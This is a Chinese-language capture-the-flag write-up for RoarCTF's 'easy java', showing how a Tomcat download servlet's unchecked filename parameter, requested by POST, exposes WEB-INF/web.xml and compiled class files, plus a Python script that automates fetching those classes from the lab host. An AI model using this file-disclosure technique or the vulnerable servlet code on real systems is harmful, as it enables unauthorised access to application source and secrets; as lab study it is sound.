# easy java

`roar ctf`

# 1.intro

![image.png](https://res.craft.do/user/full/3cf94341-028f-a488-10df-d065aa1370fc/doc/d3036717-b075-fe5b-4aff-239f3b13366f/f86b476b-7cb4-4d35-a796-06c3fe732d22)

找了一圈感觉找不到源码。

我现在在思考是不是我的错觉，但是这张图片又告诉我不是错觉是真的下载了一个文件

![image.png](https://res.craft.do/user/full/3cf94341-028f-a488-10df-d065aa1370fc/doc/d3036717-b075-fe5b-4aff-239f3b13366f/73126bfb-752d-46fd-bb1a-161230ad7617)

[`xxx/Download?filename=help.docx`](http://xxx/Download?filename=help.docx)



说回来，最开始我想着是路径遍历的问题，虽然确实是，但是我想成了`/etc` 这类经典的。

动用了`../../../` 但是喜提**notfound**

# 2.一个会触发java.io.FileNotFoundException的例子

[How to Fix the FileNotFoundException in Java.io](https://rollbar.com/blog/java-filenotfoundexception/#)

```javascript
public class FileNotFoundExceptionExample {
    public static void main(String args[]) {
        BufferedReader br = null;

        try {
            br = new BufferedReader(new FileReader("myfile.txt"));
            String data = null;

            while ((data = br.readLine()) != null) {
                System.out.println(data);
            }
        } catch (IOException ioe) {
            ioe.printStackTrace();
        } finally {
            try {
                if (br != null) {
                    br.close();
                }
            } catch (IOException ioe) {
                ioe.printStackTrace();
            }
        }
    }
}
```

- 是否可以执行路径遍历
   - 看起来可以

# 3.tomcat web-inf

i got a doc link

[Application Developer's Guide (9.0.97) - Deployment](https://tomcat.apache.org/tomcat-9.0-doc/appdev/deployment.html)

摘要一下：

- **.html, *.jsp, etc.* - The HTML and JSP pages, along with other files that must be visible to the client browser (such as JavaScript, stylesheet files, and images) for your application.
- **/WEB-INF/web.xml** - The *Web Application Deployment Descriptor* for your application. This is *::an XML file describing the servlets and other component::s* that make up your application, along with any initialization parameters and container-managed security constraints that you want the server to enforce for you. This file is discussed in more detail in the following subsection.
- **/WEB-INF/classes/** - This directory *::contains any Java class files (and associated resources) required for your application::*, including both servlet and non-servlet classes, that are not combined into JAR files. If your classes are organized into Java packages, you must reflect this in the directory hierarchy under `/WEB-INF/classes/`. ::For example, a Java class named `com.mycompany.mypackage.MyServlet` would need to be stored in a file named `/WEB-INF/classes/com/mycompany/mypackage/MyServlet.class`.::
- **/WEB-INF/lib/** - This directory ::contains JAR files that contain Java class files:: (and associated resources) required for your application, such as third party class libraries or JDBC drivers.

## 3.1 一个例子

![image.png](https://res.craft.do/user/full/3cf94341-028f-a488-10df-d065aa1370fc/doc/d3036717-b075-fe5b-4aff-239f3b13366f/270f3246-917f-4792-97f6-6171452c661d)

之前并没有仔细研究过这些，把重点全部放在了如何编写代码上。

这个是一个使用local tomcat作为服务器的项目demo（其实是一个学习java  web的时候写的我也不知道是个什么的东西）

```javascript
.idea
src
	└── main
	    ├── java
	    │   └── com.test
	    │       ├── Filters
	    │       ├── Listeners
	    │       │   └── ListenerforServletContext
	    │       └── Servlets
	    ├── resources
	    └── webapp
target
	├── classes
	│   └── com
	│       └── test
	│           ├── Filters
	│           │   └── Filter1
	│           ├── Listeners
	│           │   └── ListenerforServletContext
	│           └── Servlets
	│               └── DisplayHeader
	├── generated-sources
	└── ServletDemo2
	    ├── META-INF
	    ├── WEB-INF
	    │   ├── classes
	    │   │   └── com
	    │   │       └── test
	    │   │           ├── Filters
	    │   │           │   └── Filter1
	    │   │           ├── Listeners
	    │   │           │   └── ListenerforServletContext
	    │   │           └── Servlets
	    │   └── web.xml
	    └── lib
pom.xml
```

大概是这样，不过这个写得很不符合项目规范。

## 3.2 为什么是.class文件

存放在target目录下的均为`.class` 文件，且1：1源文件。

至于为什么是`.class` 文件

`.java` 和`.class` 之间的关系简单说就是，**::前者编译之后得到后者。::**

- `.java` ：java源代码，面向人类
- `.class` ：编译之后得到的字节码，面向JVM

要是更为深层，这和tomcat的实现有关。

## 3.3 下载文件示例

- 大多数下载请求都是通过GET而不是POST
- `doGET`
- 对比一下实际靶场的error stack，应该还有一个`doPost` 方法。

```javascript
package com.example.download;

import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.OutputStream;

@WebServlet("/download")
public class FileDownloadServlet extends HttpServlet {

    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
        // 假设这里从请求参数中获取要下载的文件名，实际应用中可能有更复杂的获取方式
        String filename = request.getParameter("filename");

        // 假设文件存放在服务器的某个特定目录下
        String fileDirectory = "/path/to/files/";

        File file = new File(fileDirectory + filename);

        if (file.exists()) {
            // 设置响应头，让浏览器知道这是一个文件下载操作，以及文件名等信息
            response.setContentType("application/octet-stream");
            response.setHeader("Content-Disposition", "attachment; filename=\"" + filename + "\"");

            // 获取文件输入流，用于读取文件内容
            FileInputStream inputStream = new FileInputStream(file);

            // 获取输出流，用于将文件内容发送到客户端（浏览器）
            OutputStream outputStream = response.getOutputStream();

            byte[] buffer = new byte[4096];
            int bytesRead;

            while ((bytesRead = inputStream.read(buffer))!= -1) {
                outputStream.write(buffer, 0, bytesRead);
            }

            // 关闭流
            inputStream.close();
            outputStream.close();
        } else {
            // 如果文件不存在，返回相应的错误信息给客户端
            response.getWriter().write("文件不存在：" + filename);
        }
    }
}
```

`doPost`

```javascript
@WebServlet("/download")
public class FileDownloadServlet extends HttpServlet {

    /...省略

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {
        // 同样从请求参数中获取要下载的文件名，实际可根据POST请求特点调整获取方式
        String filename = request.getParameter("filename");

        // 假设文件存放在服务器的某个特定目录下，这里设置该目录路径，可根据实际情况修改
        String fileDirectory = "/path/to/files/";

        File file = new File(fileDirectory + filename);

        if (file.exists()) {
            // 设置响应头，让浏览器知道这是一个文件下载操作，以及文件名等信息
            response.setContentType("application/octet-stream");
            response.setHeader("Content-Disposition", "attachment; filename=\"" + filename + "\"");

            // 获取文件输入流，用于读取文件内容
            FileInputStream inputStream = new FileInputStream(file);

            // 获取输出流，用于将文件内容发送到客户端（浏览器）
            OutputStream outputStream = response.getOutputStream();

            byte[] buffer = new byte[4096];
            int bytesRead;

            while ((bytesRead = inputStream.read(buffer))!= -1) {
                outputStream.write(buffer, 0, bytesRead);
            }

            // 关闭流
            inputStream.close();
            outputStream.close();
        } else {
            // 如果文件不存在，返回相应的错误信息给客户端
            response.getWriter().write("文件不存在：" + filename);
        }
    }
}
```

# 4.Easy java writeup

## 4.1 请求分析

![image.png](https://res.craft.do/user/full/3cf94341-028f-a488-10df-d065aa1370fc/doc/d3036717-b075-fe5b-4aff-239f3b13366f/18b9960c-5abf-4663-9766-eb654590e86d)

- GET请求
   - 为什么使用GET？与使用POST的区别？
   - 为什么GET请求无法下载反而显示notfound
     - 和靶场的doPost以及doGet实现有关
- 是什么使得下载成功的？
   - 使用了hackbar的POST

一个python模拟请求代码：

```java
import requests
import time
import random

# 模拟请求头
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Authorization": "Bearer <Your-Token>",  # 假设你已经有了一个Token
    "Content-Type": "application/json",
    "Accept": "application/json, text/plain, */*",
    "Referer": "https://example.com/",  # 模拟请求的来源地址
}

# 请求的数据（假设是一个 POST 请求，数据以 JSON 格式传递）
data = {
    "username": "test_user",
    "password": "secure_password"
}

# 请求的 URL 地址
url = "https://api.example.com/login"

# 模拟 POST 请求
def send_post_request(url, headers, data):
    try:
        # 模拟用户行为，添加延时
        time.sleep(random.uniform(1, 3))  # 随机延时 1 到 3 秒
        
        # 发送 POST 请求
        response = requests.post(url, headers=headers, json=data)

        # 检查请求是否成功
        if response.status_code == 200:
            print("POST 请求成功!")
            print("响应内容：", response.json())  # 假设返回的是 JSON 数据
        else:
            print(f"POST 请求失败，状态码：{response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"请求错误：{e}")

# 调用函数发送请求
send_post_request(url, headers, data)
```

## 4.2 请求切换

![image.png](https://res.craft.do/user/full/3cf94341-028f-a488-10df-d065aa1370fc/doc/d3036717-b075-fe5b-4aff-239f3b13366f/ab9b6ade-2b0f-43bc-8c9e-9897fe37ffaf)

修改请求的文件是`web.xml`

虽然502  error

![image.png](https://res.craft.do/user/full/3cf94341-028f-a488-10df-d065aa1370fc/doc/d3036717-b075-fe5b-4aff-239f3b13366f/4caaf87b-dcf9-49f6-811f-0eeede7e1486)

还有一句`Apache Tomcat/8.5.24`

**获取到的：**

1. `usr/local`
2. 调用链

```javascript
java.io.FileNotFoundException:

##47;usr##47;local##47;tomcat##47;webapps##47;ROOT##47;web.xml (No such file or directory)

java.io.FileInputStream.open(Native Method)
java.io.FileInputStream.open(FileInputStream.java:195)

java.io.FileInputStream.<init>(FileInputStream.java:138)
java.io.FileInputStream.<init>(FileInputStream.java:93)

com.wm.ctf.DownloadController.doPost(DownloadController.java:24)

javax.servlet.http.HttpServlet.service(HttpServlet.java:661)
javax.servlet.http.HttpServlet.service(HttpServlet.java:742)

org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)
```

- 这算是什么级别的信息泄露？
   - 错误处理不当？
      - 如果是，如何正确处理？
        - 或许是不要输出原生java的报错

## 4.3 修改正确路径

![image.png](https://res.craft.do/user/full/3cf94341-028f-a488-10df-d065aa1370fc/doc/d3036717-b075-fe5b-4aff-239f3b13366f/0d50827c-4ec3-4be1-abd5-5034311c1f5a)

相应的响应内容：

```javascript
HTTP/1.1 200 
Server: openresty
Date: Wed, 27 Nov 2024 02:15:12 GMT
Content-Type: application/xml
Connection: close
Vary: Accept-Encoding
Content-Disposition: attachment;filename=WEB-INF/web.xml
Cache-Control: no-cache
Content-Length: 1562

<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">

    <welcome-file-list>
        <welcome-file>Index</welcome-file>
    </welcome-file-list>

    <servlet>
        <servlet-name>IndexController</servlet-name>
        <servlet-class>com.wm.ctf.IndexController</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>IndexController</servlet-name>
        <url-pattern>/Index</url-pattern>
    </servlet-mapping>

    <servlet>
        <servlet-name>LoginController</servlet-name>
        <servlet-class>com.wm.ctf.LoginController</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>LoginController</servlet-name>
        <url-pattern>/Login</url-pattern>
    </servlet-mapping>

    <servlet>
        <servlet-name>DownloadController</servlet-name>
        <servlet-class>com.wm.ctf.DownloadController</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>DownloadController</servlet-name>
        <url-pattern>/Download</url-pattern>
    </servlet-mapping>

    <servlet>
        <servlet-name>FlagController</servlet-name>
        <servlet-class>com.wm.ctf.FlagController</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>FlagController</servlet-name>
        <url-pattern>/Flag</url-pattern>
    </servlet-mapping>

</web-app>
```

一种常见的servlet和mapping的bind

## 4.4 直接访问`/Flag`

抱着试一试的心

![image.png](https://res.craft.do/user/full/3cf94341-028f-a488-10df-d065aa1370fc/doc/d3036717-b075-fe5b-4aff-239f3b13366f/fdc0496b-b1ea-46ed-a772-d2f17b5c4aa6)

此路不同就走另外的路。

不过我没有想到的是走了获取字节码的路。

```javascript
<servlet>
        <servlet-name>FlagController</servlet-name>
        <servlet-class>com.wm.ctf.FlagController</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>FlagController</servlet-name>
        <url-pattern>/Flag</url-pattern>
    </servlet-mapping>
```

## 4.5 再次请求

![image.png](https://res.craft.do/user/full/3cf94341-028f-a488-10df-d065aa1370fc/doc/d3036717-b075-fe5b-4aff-239f3b13366f/52fa0c81-b118-483e-ae40-d17e530285dd)

请求得到结果

看到Come On

![image.png](https://res.craft.do/user/full/3cf94341-028f-a488-10df-d065aa1370fc/doc/d3036717-b075-fe5b-4aff-239f3b13366f/ec0e246f-758b-4796-9e0b-d9b670482f12)

## 4.6 get flag

两个等号

![image.png](https://res.craft.do/user/full/3cf94341-028f-a488-10df-d065aa1370fc/doc/d3036717-b075-fe5b-4aff-239f3b13366f/4a064951-15ac-46c4-8ad4-ce7b66bcff31)

+ base64编码都是以`==` 结尾吗？

   在 Base64 编码过程中，数据被按*每 6 位一组*进行分组，然后映射到对应的 Base64 字符表中的字符。

   当被编码的数据长度**不是 3 的倍数**时，会进行填充操作：

   1. 如果原数据长度除以 3 余 1，编码结果会在末尾添加 2 个 “=”。
   2. 如果原数据长度除以 3 余 2，编码结果会在末尾添加 1 个 “=”。
   3. 如果原数据长度是 3 的倍数，则不需要添加 “=”。

一个非常有趣的ctf

![image.png](https://res.craft.do/user/full/3cf94341-028f-a488-10df-d065aa1370fc/doc/d3036717-b075-fe5b-4aff-239f3b13366f/8bbcf1cc-547d-409b-9a05-e87eeea5a81a)

# 试图用python完成自动化

```java
import requests
import time
import random

def get_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/59.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/16.1709",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36",
    ]
    return random.choice(user_agents)

def get_headers():
    headers = {
        "User-Agent": get_user_agent(),
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
    }
    return headers

def send_get_request(url, params=None):
    try:
        headers = get_headers()  # 获取伪装的请求头
        response = requests.get(url, headers=headers, params=params)

        if response.status_code == 200:
            print("GET 请求成功!")
            print("响应内容：", response.text[:5500])
        else:
            print(f"GET 请求失败，状态码：{response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"请求错误：{e}")

def send_post_request(url, data=None):
    try:
        headers = get_headers()
        response = requests.post(url, headers=headers, data=data)

        if response.status_code == 200:
            print("POST 请求成功!")
            print("响应内容：", response.text[:500])  
        else:
            print(f"POST 请求失败，状态码：{response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"请求错误：{e}")

def main():
    print("--------It gets starting------")

    url = "http://501e1e92-a571-4fae-b8ae-6ce7c2722ed7.node5.buuoj.cn:81/"
    url = "http://501e1e92-a571-4fae-b8ae-6ce7c2722ed7.node5.buuoj.cn:81/Download?filename=help.docx"
    # params = {'username': '1', 'password': 1}
    params = {}
    send_get_request(url, params)

    time.sleep(random.uniform(1, 5))
    print("-------wait ending--------")


    data = {}
    send_post_request(url, data)

if __name__ == "__main__":
    main()
```

结果：

```java
--------It gets starting------
GET 请求成功!
响应内容： java.io.FileNotFoundException:{help.docx}
POST 请求成功!
响应内容： PK    ! ߤ�lZ     [Content_Types].xml �(� 
```

最后我也知道当时下载了help.docx不是幻觉了，是通过post下载了。

现在的问题是，

- 如何判断对方是java
   - `java.io.FileNotFoundException:{help.docx}`
- 如何判断是tomcat
   - 通过POST得到help.docx之后，随便输一个文件，比如flag.docx，回显会有服务器版本，在上面的writeup部分
   - 另外一个就是，Java web主流的是spring，要么是maven，要么是tomcat。
      - maven复制`src` ，顶多是将`resource` 放到外面
      - tomcat的部分就和上面的[tomcat部分](https://desktop.craft.do:6776/editor/d/3cf94341-028f-a488-10df-d065aa1370fc/d3036717-b075-fe5b-4aff-239f3b13366f/x/816404FD-8F2E-47CF-8DD9-B72577938A3F) 一样

## 最终版

```java
import time
import requests
import random

def get_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/59.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/16.1709",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36",
    ]
    return random.choice(user_agents)


def get_headers():
    headers = {
        "User-Agent": get_user_agent(),
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
    }
    return headers

def send_post_request(url, data=None):
    try:
        headers = get_headers()
        response = requests.post(url, headers=headers, data=data)

        if response.status_code == 200:
            if "flag" in response.text.lower():
                print("Found flag!")
                print("Response content:", response.text[:55000])
            else:
                print("POST request successful, but no flag found.")
        else:
            print(f"POST request failed, status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Request error: {e}")


catalog = "WEB-INF/classes/com/wm/ctf/"

classes = ["IndexController.class",
           "LoginController.class",
           "DownloadController.class",
           "FlagController.class"
           ]
url = f"http://501e1e92-a571-4fae-b8ae-6ce7c2722ed7.node5.buuoj.cn:81/Download?filename={catalog}"

def posts():
    for clas in classes:
        print(f"Now is {clas}")
        url_ = url + clas
        data = {}
        send_post_request(url_, data)
        time.sleep(random.uniform(10, 15))

if  __name__ == "__main__":
    posts()
```

就是最后要手动去base64解码一下

